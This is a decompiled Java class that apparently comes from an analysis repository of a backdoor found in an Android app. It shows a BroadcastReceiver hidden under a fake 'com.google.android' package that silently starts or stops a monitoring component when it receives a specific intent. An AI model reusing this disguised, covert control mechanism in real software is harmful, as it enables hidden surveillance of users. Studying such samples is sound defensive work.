package com.google.android.sd.biz_dynamic_dex.td.logcat.a.a;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.d.b;
import java.util.Timer;
import java.util.TimerTask;

public final class a extends BroadcastReceiver {
  private final Context a;
  
  private a b;
  
  private Timer c = new Timer();
  
  public a(Context paramContext) {
    this.a = paramContext;
  }
  
  public final void onReceive(Context paramContext, Intent paramIntent) {
    (new Thread(new Runnable(this, paramIntent, paramContext) {
          public final void run() {
            try {
              if (!TextUtils.equals(this.a.getAction(), "com.google.android.sd.moni.pro"))
                return; 
              StringBuilder stringBuilder = new StringBuilder("pro_on_receive_");
              stringBuilder.append(this.c.hashCode());
              b.a(stringBuilder.toString());
              String str = this.a.getStringExtra("extra_moni_intent_data");
              int i = this.a.getIntExtra("extra_moni_execute_type", 0);
              if (i == 0) {
                if (a.a(this.c) != null) {
                  b.a("pro_is_not_null");
                  return;
                } 
                a.a(this.c, a.a(this.b, str));
                if (a.a(this.c) != null && a.a(this.c).a()) {
                  a.a(this.c, str);
                  com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.b(this.b, "1");
                  return;
                } 
                b.a("pro_not_support");
                a.a(this.c, str, false);
                return;
              } 
              if (i == 1) {
                a.a(this.c, str, false);
                return;
              } 
              if (i == 2)
                a.a(this.c, str, true); 
              return;
            } catch (Exception exception) {
              return;
            } 
          }
        })).start();
  }
  
  public static interface a {
    void a(String param1String);
    
    boolean a();
    
    void b();
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\a\a\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */